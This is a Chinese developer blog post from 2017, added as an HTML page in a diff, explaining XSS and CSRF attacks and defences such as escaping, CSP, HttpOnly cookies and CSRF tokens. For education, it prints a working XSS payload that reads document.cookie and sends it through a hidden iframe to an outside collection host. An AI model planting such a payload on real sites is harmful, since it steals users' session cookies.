@@ -1,0 +1,755 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="XSS,CSRF," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="一个Web项目的安全问题是很重要的，如果你开发的程序有安全漏洞，小则影响一个公司的内部系统，大则影响到互联网下的大量用户的安全与隐私。 web的安全问题对许多学习前端开发的人来说，都有种谈虎色变的感觉，总觉着安全问题应该是由后端来解决的。反正啊，我以前在不了解的时候也是这样想的。那其实了解之后呢，才会发现安全问题是渗透在整个web项目的开发中的，无论是在前端还是在后端都会要关注安全问题，但各自又分">
+<meta name="keywords" content="XSS,CSRF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web前端安全问题">
+<meta property="og:url" content="http://yoursite.com/2017/07/07/Web前端安全问题/index.html">
+<meta property="og:site_name" content="Xuan">
+<meta property="og:description" content="一个Web项目的安全问题是很重要的，如果你开发的程序有安全漏洞，小则影响一个公司的内部系统，大则影响到互联网下的大量用户的安全与隐私。 web的安全问题对许多学习前端开发的人来说，都有种谈虎色变的感觉，总觉着安全问题应该是由后端来解决的。反正啊，我以前在不了解的时候也是这样想的。那其实了解之后呢，才会发现安全问题是渗透在整个web项目的开发中的，无论是在前端还是在后端都会要关注安全问题，但各自又分">
+<meta property="og:updated_time" content="2017-07-07T11:44:23.036Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Web前端安全问题">
+<meta name="twitter:description" content="一个Web项目的安全问题是很重要的，如果你开发的程序有安全漏洞，小则影响一个公司的内部系统，大则影响到互联网下的大量用户的安全与隐私。 web的安全问题对许多学习前端开发的人来说，都有种谈虎色变的感觉，总觉着安全问题应该是由后端来解决的。反正啊，我以前在不了解的时候也是这样想的。那其实了解之后呢，才会发现安全问题是渗透在整个web项目的开发中的，无论是在前端还是在后端都会要关注安全问题，但各自又分">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/07/07/Web前端安全问题/"/>
+
+
+
+
+
+  <title> Web前端安全问题 | Xuan </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Xuan</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">生活、技术个人博客</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/07/Web前端安全问题/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wu Xuan">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xuan">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Web前端安全问题
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-07T19:39:29+08:00">
+                2017-07-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>一个Web项目的安全问题是很重要的，如果你开发的程序有安全漏洞，小则影响一个公司的内部系统，大则影响到互联网下的大量用户的安全与隐私。</p>
+<p>web的安全问题对许多学习前端开发的人来说，都有种谈虎色变的感觉，总觉着安全问题应该是由后端来解决的。反正啊，我以前在不了解的时候也是这样想的。那其实了解之后呢，才会发现安全问题是渗透在整个web项目的开发中的，无论是在前端还是在后端都会要关注安全问题，但各自又分别有侧重的点。</p>
+<a id="more"></a>
+<p><strong>比如，前端更注重的安全问题有：XSS、CSRF（这两个经常被拿来做比较）；</strong></p>
+<p><strong>后端的有：SQL注入、用户密码安全等；</strong></p>
+<p><strong>在前后端传输过程中要注意的有：HTTP窃听、HTTPS、数据加密传输等；</strong></p>
+<p>由于本人是做前端开发的，所以以下所要讲的主要是针对前端开发中需要注意的XSS和CSRF，以及对应的防御方法，也希望把自己看的一些文章做个总结和梳理。</p>
+<h3 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h3><p>跨站脚本攻击XSS，英文全称Cross Site Scripting，很明显，按理说应该简写为CSS嘛，不过你也知道CSS广为人知的含义是层叠样式表，所以啊，为避免混淆，就被简写为了XSS.</p>
+<p>OWASP（一个组织）给出的XSS漏洞定义如下：</p>
+<blockquote>
+<p>“一名攻击者可以利用XSS漏洞向不知情的用户发送恶意脚本。终端用户的浏览器无法确定这些脚本是否可信任，并且会自动运行这些恶意脚本。因为它会认为这个脚本来自一个可信任的源，而恶意脚本将访问浏览器中保存的cookie、会话token或其他的敏感信息，并利用这些信息来完成其他的恶意目的，而有些脚本甚至还可以修改页面的HTML代码。”</p>
+</blockquote>
+<p>简单用个例子告诉大家它干了什么！</p>
+<p>比如在一个卖商品的网站上有个可以让你快速搜索到你想要东西的搜索框，我们在里面输入:</p>
+<p><code>&lt;script&gt;alert(&#39;攻击窗口&#39;)&lt;/script&gt;</code></p>
+<p>一般来说，网站没有搜到该商品时，会在页面上显示出你提交时的名称，这里如果没有对输入信息进行过滤或转义的话，会在页面上显示“找不到<script>alert(‘攻击窗口’)</script>”这类反馈信息，其中包含了我们刚刚输入的原样信息。结果呢，这时会发现页面上弹出了“攻击窗口”这个窗口。</p>
+<p>同样的道理，我们可以在评论区中发表内容，里面也包含一些不安全的脚本代码，只要前后端有这个漏洞，这些 恶意代码都能被其它浏览该评论的用户端执行。</p>
+<p>所以通过上面的描述，大致能够解释下XSS：</p>
+<p>攻击的入手处往往是网站中涉及到站内交互的地方，比如说可以发表评论的地方，攻击者可以在要发布的内容中嵌入一些恶意的javascript代码，而这段内容发送给服务器端后又没有经过过滤或者转义，之后被作为普通文本内容返回到了用户浏览的页面上，当用户访问这个页面时就会运行这些恶意脚本，从而达到攻击用户的效果。</p>
+<h3 id="XSS攻击的防御方法"><a href="#XSS攻击的防御方法" class="headerlink" title="XSS攻击的防御方法"></a>XSS攻击的防御方法</h3><p><strong>1.对内容进行过滤和转义</strong></p>
+<p> 上面介绍XSS的东西时，我经常说到过滤和转义，也是因为这就是防御XSS的一种经典方法。</p>
+<p>比如利用</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> escapeHtml = <span class="function"><span class="keyword">function</span>(<span class="params">str</span>) </span>&#123; </div><div class="line">  	<span class="keyword">if</span>(!str) <span class="keyword">return</span> <span class="string">''</span>; </div><div class="line">	str = str.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>); </div><div class="line">  	str = str.replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>); </div><div class="line">  	str = str.replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>); </div><div class="line">  	str = str.replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quto;'</span>); </div><div class="line">  	str = str.replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>); </div><div class="line">  	<span class="keyword">return</span> str;</div><div class="line">&#125;</div><div class="line"> <span class="keyword">var</span> input = escapeHtml(<span class="string">`&lt;script&gt;alert('攻击窗口')&lt;/script&gt;`</span>);</div><div class="line">作者： TooooBug </div><div class="line">链接：http:<span class="comment">//www.imooc.com/article/18069</span></div></pre></td></tr></table></figure>
+<p>这时，输入的内容就变成了:</p>
+<p><code>&amp;lt;script&amp;gt;alert(&amp;#39;SB&amp;#39;)&amp;lt;/script&amp;gt;</code>，这样它就不会被理解成js代码了。</p>
+<p>当然，有时候不一定全部的字符都需要过滤和转义，要视具体情况来决定哪些需要、哪些不需要。</p>
+<p>另外，我们虽然知道了需要对<code>&lt;script&gt;</code>、<code>&lt;iframe&gt;</code>这些特殊的标签要格外警惕，但同时要注意一下，不只是script标签是可以运行脚本的，任何的html标签都可以加上类似onclick，onload这样的事件也都可以运行脚本，因此JS事件的名称也需要过滤。</p>
+<p><strong>2.CSP方法</strong></p>
+<p>内容安全策略CSP这个方法我也了解不多，最近看的，是一个新的安全策略，全称Content Security Policy.</p>
+<p>它可以和第一种方法做一个比较，第一种方法的核心是要让具有XSS攻击的代码不要变成代码，而CSP方法的思路是恶意代码依然以程序的形式出现，不过我可以控制它的执行与否，实质上是定义页面上哪一些内容是可被信任的，哪一些内容不被信任。因为我们自己的脚本是预先就知道并放在页面上的，所以我们可以设置好信任关系，当有 XSS 脚本出现时，它并不在我们的信任列表中，因此可以阻止它运行。</p>
+<p>具体使用方式是在 HTTP 头中输出 CSP 策略：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Content-Security-Policy: &lt;policy-directive&gt;; &lt;policy-directive&gt;</div></pre></td></tr></table></figure>
+<p>从语法上可以看到，一个头可以输出多个策略，每一个策略由一个指令和指令对应的值组成。指令可以理解为指定内容类型的，比如<code>script-src</code>指令用于指定脚本，<code>img-src</code>用于指定图片。值则主要是来源，比如某个指定的URL，或者<code>self</code>表示同源，或者<code>unsafe-inline</code>表示在页面上直接出现的脚本等。</p>
+<p>具体到上面的 XSS 例子，可以使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Content-Security-Policy: script-src &apos;self&apos;;</div></pre></td></tr></table></figure>
+<p>这样子，只要是非同源的脚本都不可以执行了，当然也就不存在XSS攻击了。</p>
+<p><strong>3.cookie的防劫持</strong></p>
+<p>向我们前面介绍的小例子实现的也只能算是小恶作剧罢了，而真正地利用XSS的攻击手段，攻击者可能会获取到用户的cookie信息，继而做其他有攻击性的事情。针对这一点，这边主要讲解下该情况下的防御手段，也可以理解成cookie的防劫持手段。</p>
+<p>show you the other’s code！hhh</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 用 &lt;script type="text/javascript"&gt;&lt;/script&gt; 包起来放在评论中</span></div><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window, document</span>) </span>&#123;</div><div class="line">    <span class="comment">// 构造泄露信息用的 URL</span></div><div class="line">    <span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie;</div><div class="line">    <span class="keyword">var</span> xssURIBase = <span class="string">"http://192.168.123.123/myxss/"</span>;</div><div class="line">    <span class="keyword">var</span> xssURI = xssURIBase + <span class="built_in">window</span>.encodeURI(cookies);</div><div class="line">    <span class="comment">// 建立隐藏 iframe 用于通讯</span></div><div class="line">    <span class="keyword">var</span> hideFrame = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</div><div class="line">    hideFrame.height = <span class="number">0</span>;</div><div class="line">    hideFrame.width = <span class="number">0</span>;</div><div class="line">    hideFrame.style.display = <span class="string">"none"</span>;</div><div class="line">    hideFrame.src = xssURI;</div><div class="line">    <span class="comment">// 开工</span></div><div class="line">    <span class="built_in">document</span>.body.appendChild(hideFrame);</div><div class="line">&#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</div></pre></td></tr></table></figure>
+<p>上面这段代码，实现了利用document.cookie获取到了用户的信息，并发起了用户看不到的请求，将用户的cookies发送到了收集服务器上。可见cookie要是不加以保护，很容易就会被攻击者劫持去干坏事。。</p>
+<p>那怎么办，怎么办！好了，下面就该介绍防御方法了：</p>
+<ul>
+<li><strong>方法一：</strong></li>
+</ul>
+<p><strong>给重要的cookie添加HttpOnly属性</strong>, 这种属性设置后, cookie只能在http请求中传递, 而在脚本中, document.cookie就无法获取到该cookie值了。（该方法对XSS的攻击,有一定的防御值. 但是对网络拦截, 还是会泄露）</p>
+<ul>
+<li><strong>方法二：</strong></li>
+</ul>
+<p><strong>在cookie中添加校验信息</strong>, 这个校验信息和当前用户外置环境比如ip,user agent等有关. 这样当cookie被人劫持了, 并冒用, 但是在服务器端校验的时候, 发现校验值发生了变化, 因此要求重新登录, 这样也是种很好的思路, 去规避cookie劫持.</p>
+<ul>
+<li><strong>方法三：</strong></li>
+</ul>
+<p><strong>cookie中session id的定时更换, 让session id按一定频率变换</strong>, 同时对用户而言, 该操作是透明的, 这样保证了服务体验的一致性.</p>
+<h3 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h3><p>终于可以讲到CSRF了，码字好累！</p>
+<p>CSRF，报上大名，Cross Site Request Foggy，即跨站请求攻击。简单来说，其实就是攻击者盗用你的身份，以你的名义发送恶意请求。</p>
+<p><strong>比较一下CSRF和XSS的区别</strong>，发现XSS的目的是获取用户的身份信息，攻击者窃取到的是用户的身份（session/cookie），而CSRF则是利用用户当前的身份去做一些未经过授权的操作，比如，用你的名义完成网银转账，发送诈骗短信给你的好友等。可以看成CSRF是攻击者的目的，而要达到这个目的，可以有多种路径，而XSS就是其中一种。</p>
+<p><strong>实现CSRF攻击的一个大概步骤是这样的：</strong></p>
+<p>1.小吴现在浏览一个受信任的网站A，并在A网站以合法身份登录了，结果服务器会返回cookie，且cookie在本地存储了。</p>
+<p>2.小吴没有关闭A网站，或者即使关闭了浏览器，cookie依然没有过期。这时小吴在其他网页上不小心被一个链接吸引了，点进了一个危险网站B，当他点进这个链接时，B网站已经悄悄地携带1中的cookie给A网站发送了一个请求。</p>
+<p>3.而A网站接收到包含该cookie的请求，会误以为这是小吴本人发起的请求，接着，攻击者就可以以你的名义继续其他不安全操作了。</p>
+<p>简单总结，要完成一次CSRF攻击，受害者必须依次完成两个步骤 ：</p>
+<ul>
+<li>1.登录受信任网站A，并在本地生成Cookie 。</li>
+<li>2.在不退出A的情况下，访问危险网站B。</li>
+</ul>
+<h3 id="CSRF攻击的防御方法"><a href="#CSRF攻击的防御方法" class="headerlink" title="CSRF攻击的防御方法"></a>CSRF攻击的防御方法</h3><p>预防CSRF攻击的方式方法有多种，但思想上都是差不多的，主要从以下2个方面入手：</p>
+<ul>
+<li>1．正确使用GET,POST和Cookie；</li>
+<li>2．在非GET请求中增加伪随机数；</li>
+</ul>
+<p>在Web应用中，一般来说：GET常用在查看，列举，展示等不需要改变资源属性的时候；POST常用在下达订单，改变一个资源的属性或者做其他一些事情。</p>
+<p>因此，我们可以限定修改只能使用POST，当GET方式请求时就拒绝响应，这样可以解决以GET方式的CSRF攻击。但这样还是不够的，因为POST也是可以模拟的。</p>
+<p>因此我们需要实施第二步，在非GET方式的请求中增加随机数，这个大概有三种方式来进行：</p>
+<ul>
+<li>为每个用户生成一个唯一的cookie token，所有表单都包含同一个伪随机值，这种方案最简单，因为攻击者不能获得第三方的Cookie(理论上)，所以表单中的数据也就构造失败，但是由于用户的Cookie很容易由于网站的XSS漏洞而被盗取，所以这个方案必须要在没有XSS的情况下才安全。</li>
+<li>每个请求使用<strong>验证码</strong>（一般是要求填写一个图片上随机字符串），这种方法可以区分是否是用户的输入，但因为要多次输入验证证，用户体验略差，所以不适合实际运用。</li>
+<li>不同的表单包含一个不同的伪随机值。</li>
+</ul>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>关于前端安全，XSS问的多一些。以上关于CSRF的解释自认为还有很多细节没讲清楚，以后会来完善。</p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://segmentfault.com/a/1190000004623125" target="_blank" rel="external">总结 XSS 与 CSRF 两种跨站攻击</a></p>
+<p><a href="http://www.imooc.com/article/18069" target="_blank" rel="external">XSS 和 CSRF 攻击的一些非常规防御方法</a></p>
+<p><a href="https://segmentfault.com/a/1190000007059639" target="_blank" rel="external">用大白话谈谈XSS与CSRF</a></p>
+<p><a href="http://www.cnblogs.com/doit8791/p/5926575.html" target="_blank" rel="external">Web安全之Cookie劫持</a></p>
+<p><a href="https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.1.md" target="_blank" rel="external">预防CSRF攻击</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/XSS/" rel="tag"># XSS</a>
+          
+            <a href="/tags/CSRF/" rel="tag"># CSRF</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/07/04/CSS-hack/" rel="next" title="CSS hack">
+                <i class="fa fa-chevron-left"></i> CSS hack
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="Wu Xuan" />
+          <p class="site-author-name" itemprop="name">Wu Xuan</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              
+                <span class="site-state-item-count">4</span>
+                <span class="site-state-item-name">标签</span>
+              
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS攻击"><span class="nav-number">1.</span> <span class="nav-text">XSS攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS攻击的防御方法"><span class="nav-number">2.</span> <span class="nav-text">XSS攻击的防御方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF攻击"><span class="nav-number">3.</span> <span class="nav-text">CSRF攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF攻击的防御方法"><span class="nav-number">4.</span> <span class="nav-text">CSRF攻击的防御方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考链接"><span class="nav-number">6.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wu Xuan</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
